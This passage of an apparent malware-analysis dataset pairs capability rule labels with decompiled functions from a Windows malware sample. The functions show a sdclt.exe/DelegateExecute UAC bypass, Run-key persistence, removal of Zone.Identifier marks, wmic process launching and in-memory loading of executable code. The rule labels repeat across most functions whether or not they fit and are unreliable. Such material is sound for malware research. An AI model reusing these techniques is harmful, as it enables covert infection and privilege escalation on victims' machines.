{\n                puVar3 = arg_8h + 1;\n                iVar4 = in_EDX + -2;\n                if ((uVar2 & 2) == 0) {\n                    uVar2 = *piVar7;\n                    iVar5 = arg_ch + 0x8000 + *puVar3 + uVar2 * 0x10000;\n                    *piVar7 = iVar5 >> 0x10;\n                    uVar6 = iVar5 + uVar2 * -0x10000 >> 0x10;\n                    uVar2 = 1;\n                    if (uVar6 - (arg_ch >> 0x10) != 1) {\n                        if (uVar6 == arg_ch >> 0x10) goto code_r0x00410601;\n                        uVar2 = 2;\n                    }\n                    *arg_8h = *arg_8h | uVar2;\n                }\n            }\n            else if (uVar1 == 2) {\n                *piVar7 = *piVar7 + arg_ch;\n            }\n            else if (((uVar1 != 0) && (uVar1 != 6)) && (uVar1 != 7)) {\n                if (uVar1 != 0xb) {\n                    return NULL;\n                }\n                puVar3 = arg_8h + 2;\n                uVar6 = *puVar3 * 0x10000;\n                uVar8 = uVar6 + arg_8h[1];\n                uVar9 = uVar8 + arg_ch;\n                *piVar7 = (uVar9 + 0x8000 >> 0x10 |\n                          (((*piVar7 << 0x10) * 0x10000 >> 0x20) + (*puVar3 >> 0x10) + CARRY4(uVar6, arg_8h[1]) +\n                           arg_10h + CARRY4(uVar8, arg_ch) + (0xffff7fff < uVar9)) * 0x10000) + 0x8000 >> 0x10;\n                iVar4 = in_EDX + -3;\n            }\ncode_r0x00410601:\n            arg_8h = puVar3 + 1;\n            in_EDX = iVar4;\n        } while (iVar4 != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 835
    },
    "004109d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004109d2(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.004106c4();\n    if ((iVar3 == 0) || (arg_8h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(iVar3 + 0x50), 0x3000, 0x40),  arg_8h == 0)\n       ) {\n        arg_8h = 0;\n    }\n    else {\n        iVar4 = *(iVar3 + 0x14) + 0x18 + iVar3;\n        fcn.0040102c(arg_8h, param_1, *(iVar4 + 0x14));\n        uVar2 = 0;\n        bVar6 = *(iVar3 + 6) != 0;\n        while (bVar6) {\n            iVar5 = uVar2 * 0x28;\n            fcn.00401052(*(iVar5 + 0xc + iVar4) + arg_8h, 0, *(iVar5 + 8 + iVar4));\n            fcn.0040102c(*(iVar5 + 0xc + iVar4) + arg_8h, *(iVar5 + 0x14 + iVar4) + param_1, *(iVar5 + 0x10 + iVar4));\n            uVar2 = uVar2 + 1;\n            bVar6 = uVar2 < *(iVar3 + 6);\n        }\n        uVar7 = fcn.004108fd();\n        cVar1 = fcn.00410756(arg_8h - uVar7, ((arg_8h >> 0x1f) - (uVar7 >> 0x20)) - (arg_8h < uVar7));\n        if (((cVar1 != '\\0') && (cVar1 = fcn.004107c4(),  cVar1 != '\\0')) && (param_2 != 0)) {\n            (*(*(iVar3 + 0x28) + arg_8h))(arg_8h, 1, 0);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 561
    },
    "00410f4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410f4c(uint *lpValueName)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) && (iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(*in_ECX, *lpValueName),  iVar1 == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "00410f6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00410f6e(uint noname_0, uint *lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, *lpSubKey, 0, 0, 1, 1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 94
    },
    "00410fae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410fae(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 64
    },
    "00411136": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411136(int32_t lpFileName, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint noname_0;\n    uint extraout_ECX;\n    uint uVar3;\n    int32_t *arg_8h;\n    uchar *arg_8h_00;\n    uchar *arg_14h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpExistingFileName;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.0040f481();\n    fcn.004034a7();\n    iVar1 = fcn.00410f6e(noname_0, in_ECX + 4);\n    fcn.00410fae();\n    uVar3 = 0;\n    if ((iVar1 != 0) && (lpFileName != 0)) {\n        uVar2 = fcn.0040f76b();\n        fcn.00403437(uVar2);\n        fcn.00405ea5();\n        fcn.0040f71f();\n        fcn.0040362d(in_ECX + 0x13);\n        fcn.0040346a(0x414684);\n        fcn.00403335(&var_ch);\n        fcn.00405ea5();\n        iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, in_ECX[8]);\n        if (iVar1 == 0) goto code_r0x0041148d;\n        arg_14h = &stack0xffffffa8;\n        fcn.00403221(&stack0xffffffa8);\n        arg_8h_00 = &stack0xffffff9c;\n        uVar3 = extraout_ECX;\n        uVar2 = extraout_ECX;\n        fcn.00405911(&stack0xffffff9c);\n        fcn.004060aa(arg_8h_00, uVar3, uVar2, arg_14h);\n        fcn.0041106c(0x80000001, in_ECX + 4, 0xf003f, 0);\n        fcn.00411039(in_ECX + 6, &var_20h, 3);\n        fcn.00403036();\n    }\n    if (*in_ECX == 0) {\n        fcn.0041106c(0x80000001, in_ECX + 4, 0xf003f, 0);\n    }\n    if (arg_10h == 0) {\ncode_r0x004113d6:\n        uVar3 = 0;\n        if (arg_ch != 0) {\n            if (lpFileName == 0) {\n                fcn.00403437(&lpExistingFileName);\n            }\n            iVar1 = fcn.0041106c(in_ECX[2], in_ECX + 5, 0x20006, 0);\n            if (iVar1 == 0) goto code_r0x0041148d;\n            fcn.0040362d(in_ECX + 0x15);\n            arg_8h = in_ECX + 8;\n            uVar2 = fcn.00402fda(arg_8h);\n            iVar1 = fcn.00411039(&lpFileName, uVar2, arg_8h);\n            fcn.00405ea5();\n            fcn.00403036();\n            if (iVar1 == 0) goto code_r0x0041148d;\n            fcn.00410fae();\n        }\n        fcn.004035e5(in_ECX[8]);\n        uVar3 = fcn.004035e5(L\":Zone.Identifier\");\n        fcn.00403335(uVar3);\n        fcn.00405ea5();\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)();\n        uVar3 = 1;\n    }\n    else {\n        (*_sym.imp.SHELL32.dll_SHGetKnownFolderPath)();\n        fcn.004035e5(var_18h);\n        fcn.0040346a(L\"\\\\programs.bat\");\n        fcn.004035e5(L\"for /F \\\"usebackq tokens=*\\\" %%A in (\\\"\");\n        fcn.0040346a(var_ch);\n        fcn.0040346a(var_ch);\n        fcn.0040346a(var_ch);\n        fcn.00403554(&var_1ch);\n        fcn.00403554(&var_14h);\n        uVar3 = fcn.00403261();\n        fcn.00411d35(uVar3);\n        fcn.00405ea5();\n        fcn.00405ea5();\n        fcn.0040f76b();\n        fcn.0040346a(L\":ApplicationData\");\n        fcn.004035e5(L\"wmic process call create \\'\\\"\");\n        uVar3 = var_14h;\n        fcn.0040346a(var_14h);\n        fcn.0040346a(uVar3);\n        fcn.0040346a(L\":start\");\n        fcn.00403554(&var_14h);\n        fcn.00403554(&var_1ch);\n        uVar3 = fcn.00403261();\n        fcn.00411d35(uVar3);\n        fcn.00405ea5();\n        fcn.00405ea5();\n        uVar3 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, var_14h, 0);\n        if (iVar1 != 0) {\n            fcn.00405ea5();\n            arg_10h = 0;\n            fcn.00405ea5();\n            fcn.00405ea5();\n            var_8h = 0;\n            fcn.00405ea5();\n            goto code_r0x004113d6;\n        }\n        fcn.00405ea5();\n        arg_10h = 0;\n        fcn.00405ea5();\n        fcn.00405ea5();\n        var_8h = 0;\n    }\n    fcn.00405ea5();\ncode_r0x0041148d:\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return uVar3;\n}\n",
        "token_count": 1431
    },
    "004114a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004114a6(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uchar *arg_8h_00;\n    uint *arg_8h_01;\n    uint arg_8h_02;\n    uint uVar4;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = arg_8h;\n    fcn.004023ca(arg_8h);\n    iVar2 = fcn.0040fbfc();\n    if (iVar2 == 1) {\n        uVar4 = 0x23;\n        uVar3 = 0x80000002;\n    }\n    else {\n        uVar4 = 0x1a;\n        uVar3 = 0x80000001;\n    }\n    *(in_ECX + 8) = uVar3;\n    *(in_ECX + 0xc) = uVar4;\n    uVar3 = fcn.004035e5(L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\\");\n    fcn.00403437(uVar3);\n    fcn.00405ea5();\n    fcn.0040362d(iVar1 + 0x30);\n    fcn.00403335(&arg_8h);\n    fcn.00405ea5();\n    uVar3 = fcn.004035e5(L\"inst\");\n    fcn.00403437(uVar3);\n    fcn.00405ea5();\n    uVar3 = fcn.004035e5(L\"InitWindows\");\n    fcn.00403437(uVar3);\n    fcn.00405ea5();\n    uVar3 = fcn.004035e5(L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\");\n    fcn.00403437(uVar3);\n    fcn.00405ea5();\n    iVar2 = fcn.0041106c(0x80000001, in_ECX + 0x10, 0xf003f, 0);\n    *(in_ECX + 0x24) = iVar2;\n    if (iVar2 != 0) {\n        var_ch = 0;\n        var_8h = 0;\n        if (*(iVar1 + 0x18) != 0) {\n            iVar2 = fcn.00410fc3(in_ECX + 0x18, &var_ch);\n            if (iVar2 == 0) {\n                *(in_ECX + 0x28) = 0;\n            }\n            else {\n                arg_8h_01 = &var_ch;\n                arg_8h_02 = extraout_ECX;\n                fcn.0040304c(arg_8h_01);\n                arg_8h_00 = &stack0xffffff7c;\n                uVar3 = extraout_ECX_00;\n                uVar4 = extraout_ECX_00;\n                fcn.00405911(&stack0xffffff7c);\n                fcn.004060aa(arg_8h_00, uVar3, uVar4, arg_8h_01);\n                uVar3 = fcn.00402ecf(arg_8h_02);\n                fcn.00403437(uVar3);\n                fcn.00405ea5();\n                arg_8h = 0;\n                fcn.00403036();\n                *(in_ECX + 0x28) = 1;\n            }\n        }\n        if (*(iVar1 + 0x20) != 0) {\n            uVar3 = fcn.0040f481();\n            fcn.00403437(uVar3);\n            fcn.00405ea5();\n        }\n        fcn.00403036();\n    }\n    return;\n}\n",
        "token_count": 856
    },
    "0041165b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041165b(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    int32_t *in_ECX;\n    uint *arg_8h_00;\n    uint var_8h;\n    \n    if (*in_ECX != 0) {\n        arg_8h_00 = &var_8h;\n        arg_ch_00 = fcn.00403221(arg_8h_00);\n        fcn.00411039(arg_8h, arg_ch_00, arg_8h_00);\n        fcn.00403036();\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00411a3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00411a3c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    fcn.00401052(0x54cbf0, 0, 0x208);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, 0x54cbf0, 0x208);\n    iVar1 = (*_sym.imp.SHELL32.dll_IsUserAnAdmin)();\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040fbfc();\n        if (iVar1 != 1) {\n            fcn.004119c9();\n            uVar2 = fcn.00411ca2();\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(uVar2, 0x66, 0x4172c4);\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, uVar3);\n            (*_sym.imp.KERNEL32.dll_SizeofResource)(uVar2, uVar3);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(uVar4);\n            if (iVar1 != 0) {\n                fcn.00411936();\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 291
    },
    "00411ab9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00411ab9(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpFilename;\n    uint lpString1;\n    uint pExecInfo;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint hProcess;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040fbfc();\n    if (iVar1 != 1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x4198b8);\n        var_4h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_4h);\n        (*_sym.imp.KERNEL32.dll_IsWow64Process)(uVar2);\n        if (var_4h != 0) {\n            fcn.0040f7e0();\n        }\n        fcn.004118ba();\n        fcn.00401052(&lpFilename, 0, 0x400);\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x400);\n        fcn.00411855(0x416056, &lpFilename);\n        fcn.00411855(\"DelegateExecute\", 0x416056);\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lpString1, 0x104);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, L\"\\\\sdclt.exe\");\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x414688, &lpString1, 0, 0, 1);\n        var_34h = &lpString1;\n        pExecInfo = 0x3c;\n        var_40h = 0x40;\n        var_3ch = 0;\n        var_38h = 0x414688;\n        var_30h = *0x417570;\n        uStack48 = *0x417574;\n        uStack44 = *0x417578;\n        uStack40 = *0x41757c;\n        (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 0);\n        if (var_4h != 0) {\n            fcn.0040f7b9();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(2000);\n        (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\");\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    return 0;\n}\n",
        "token_count": 644
    },
    "00412367": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00412367(void)\n\n{\n    fcn.0041026f();\n    if ((*0x54d0b8 != 0) && (*0x54d0b4 != 0)) {\n        fcn.00412c91(*0x54d0b4);\n        *0x54d0b8 = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x54d0bc);\n    return;\n}\n",
        "token_count": 103
    },
    "0041239e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041239e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    \n    fcn.0041026f();\n    if (*0x54d0b8 == 0) {\n        if (*0x54d0b4 == 0) {\n            iVar1 = fcn.00405f53();\n            if (iVar1 == 0) {\n                *0x54d0b4 = 0;\n            }\n            else {\n                *0x54d0b4 = fcn.00412ed4(extraout_ECX);\n            }\n        }\n        *0x54d0b0 = arg_8h;\n        *0x54d0b8 = 1;\n        fcn.00412d0a(arg_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x54d0bc);\n    return;\n}\n",
        "token_count": 207
    },
    "00412a6b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412a6b(uint32_t param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *ppv;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uVar1 = fcn.00412447();\n    if (uVar1 < param_1) {\n        param_1 = 0;\n    }\n    uVar1 = 0;\n    *param_2 = 0;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4145e0, 0, 1, 0x4173f0, &ppv);\n    if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x4145d0, &var_4h, 0),  var_4h != NULL)) {\n        (**(*var_4h + 0x14))(var_4h);\n        while( true ) {\n            var_8h = 0;\n            iVar2 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, &var_8h);\n            if (iVar2 != 0) break;\n            (**(*var_ch + 0x20))(var_ch, 0, 0, 0x414580, param_2);\n            if (*param_2 != 0) {\n                if (uVar1 == param_1) break;\n                uVar1 = uVar1 + 1;\n                fcn.004024e0();\n            }\n        }\n        if (var_4h != NULL) {\n            (**(*var_4h + 8))(var_4h);\n            var_4h = NULL;\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n        }\n    }\n    return;\n}\n",
        "token_count": 429
    },
    "00412d0a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412d0a(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint *puVar4;\n    uint in_stack_fffffe8c;\n    uint var_c4h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_60h;\n    uchar auStack52 [4];\n    uint var_2ch;\n    uint var_28h;\n    uint var_22h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)();\n    (*_sym.imp.ole32.dll_CoCreateInstance)();\n    if (in_ECX[6] != NULL) {\n        (***in_ECX[6])();\n        if (in_ECX[7] != NULL) {\n            (**(*in_ECX[7] + 4))();\n            if (in_ECX + 8 != NULL) {\n                fcn.00412a6b();\n            }\n            if (in_ECX[8] != 0) {\n                (*_sym.imp.ole32.dll_CoCreateInstance)();\n                piVar1 = in_ECX[9];\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0xc))();\n                    (**(*in_ECX[9] + 0xc))();\n                    fcn.00401052();\n                    (**(*in_ECX[6] + 0x10))();\n                    iVar2 = fcn.00412688();\n                    in_ECX[10] = iVar2;\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.004126a4();\n                        in_ECX[0xb] = iVar2;\n                        if (iVar2 != 0) {\n                            iVar2 = (**(*in_ECX[9] + 0x2c))();\n                            if (-1 < iVar2) {\n                                (**(*in_ECX[6] + 0x14))();\n                                fcn.0040102c(auStack52 + ((var_80h + 0x30) - var_80h) + -0x30, var_80h + 0x30, 0x28);\n                                fcn.004124eb();\n                                fcn.00412b2a(arg_8h, var_28h, var_2ch, var_22h);\n                                fcn.00405ca3();\n                                puVar3 = *(in_ECX[1] + arg_8h * 4);\n                                puVar4 = &stack0xfffffe8c;\n                                for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                    *puVar4 = *puVar3;\n                                    puVar3 = puVar3 + 1;\n                                    puVar4 = puVar4 + 1;\n                                }\n                                fcn.004125d8(in_stack_fffffe8c);\n                                iVar2 = fcn.00412688();\n                                in_ECX[0xc] = iVar2;\n                                if (iVar2 != 0) {\n                                    (**(*in_ECX[6] + 0x24))(in_ECX[6], *in_ECX, 0);\n                                    (***in_ECX[9])(in_ECX[9], 0x4145c0, in_ECX + 0xd);\n                                    piVar1 = in_ECX[0xd];\n                                    if (piVar1 != NULL) {\n                                        (**(*piVar1 + 0x1c))(piVar1);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 811
    },
    "00413435": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00413435(void)\n\n{\n    code *pcVar1;\n    uchar *arg_8h;\n    uchar *puVar2;\n    uint extraout_ECX;\n    uchar *puStack1688;\n    uint uStack1684;\n    uint uStack1680;\n    char *pcStack1676;\n    uint uStack1672;\n    uchar *puStack1668;\n    uint uStack1664;\n    int32_t iVar3;\n    uint uStack1620;\n    uint uStack1616;\n    uchar auStack1608 [4];\n    uint uStack1604;\n    uint uStack1596;\n    int32_t iStack1584;\n    uint uStack1572;\n    uint uStack1564;\n    int32_t iStack1540;\n    int32_t iStack1536;\n    int32_t iStack1532;\n    uint uStack1528;\n    uchar auStack1496 [16];\n    int32_t iStack1480;\n    uchar auStack1252 [8];\n    uchar auStack1244 [20];\n    uchar auStack1224 [1220];\n    \n    uStack1604 = 10;\n    uStack1596 = 0;\n    fcn.00405bf1();\n    fcn.00411638();\n    (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    fcn.004010ad();\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    iVar3 = 0;\n    fcn.00411e21();\n    if (iVar3 == 0) goto code_r0x004136ad;\n    uStack1620 = 0;\n    fcn.00411bf8(0x215a, &stack0xfffff9ac);\n    iVar3 = 0x20;\n    arg_8h = fcn.00401085();\n    puVar2 = arg_8h;\n    do {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.0040102c(arg_8h, &stack0xfffff9ac, 4);\n    uStack1664 = 0x4134f0;\n    *0x4198b8 = (*_sym.imp.KERNEL32.dll_CreateEventA)();\n    uStack1664 = 0x4134fb;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar3 == 0xb7) || (*0x4198b8 == 0)) goto code_r0x004136ad;\n    uStack1664 = 0;\n    puStack1668 = NULL;\n    uStack1672 = 0;\n    pcStack1676 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\";\n    uStack1680 = 0x80000001;\n    uStack1684 = 0x413535;\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegSetValueExA;\n    puStack1688 = &stack0xfffff98c;\n    uStack1684 = 4;\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uStack1664, \"MaxConnectionsPer1_0Server\", 0, 4);\n    puVar2 = &stack0xfffff974;\n    (*pcVar1)(puStack1688, \"MaxConnectionsPerServer\", 0, 4, puVar2, 4);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(puVar2);\n    fcn.00405a10();\n    fcn.004114a6(&stack0xfffff96c);\n    fcn.00404ee7(&stack0xfffff968, &stack0xfffff9b8);\n    fcn.00401052(&stack0xfffffb38, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &stack0xfffffb38);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&stack0xfffffb24, L\"\\\\Microsoft Vision\\\\\");\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&stack0xfffffb1c, 0);\n    if (iStack1536 != 0) {\n        iVar3 = fcn.0040fbfc();\n        if (iVar3 != 1) {\n            iVar3 = fcn.0040f51d();\n            if (iVar3 == 10) {\n                fcn.00411ab9();\n            }\n            else {\n                fcn.00411a3c();\n            }\n        }\n    }\n    if (iStack1532 != 0) {\n        iVar3 = fcn.0040fbfc();\n        if (iVar3 == 1) {\n            fcn.00412fd7();\n        }\n    }\n    if (iStack1480 == 0) {\n        fcn.00411136(uStack1572, uStack1564, uStack1528);\n        if (iStack1584 == 0) goto code_r0x0041368a;\n        uStack1616 = 0;\n        uStack1664 = 0x413664;\n        fcn.0040362d(&stack0xfffffa28);\n        puStack1668 = &stack0xfffff9ac;\n        pcStack1676 = 0x413678;\n        uStack1664 = extraout_ECX;\n        fcn.00410bd9(&stack0xfffff9a4, puStack1668);\n        pcStack1676 = 0x413681;\n        fcn.00405ea5();\n        pcStack1676 = 0x413688;\n        fcn.00405ea5();\n    }\n    else {\ncode_r0x0041368a:\n        if (iStack1540 != 0) {\n            fcn.00411f13();\n        }\n        fcn.00404e5b();\n    }\n    fcn.00404bc0();\ncode_r0x004136ad:\n    fcn.004110d7();\n    fcn.00405c16();\n    return 0;\n}\n",
        "token_count": 1365
    },
    "00413d89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00413d89(int32_t *arg_8h)\n\n{\n    int32_t unaff_ESI;\n    uchar *arg_8h_00;\n    uchar auStack16 [12];\n    \n    fcn.00413786(auStack16, arg_8h[2], 4);\n    if (unaff_ESI != 0) {\n        arg_8h_00 = &stack0xffffffe4;\n        fcn.0040304c(arg_8h_00);\n        fcn.00413d6e(arg_8h_00);\n        fcn.00413cff(**arg_8h, (*arg_8h)[1]);\n    }\n    fcn.00403036();\n    return unaff_ESI != 0;\n}\n",
        "token_count": 171
    },
    "00401052": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
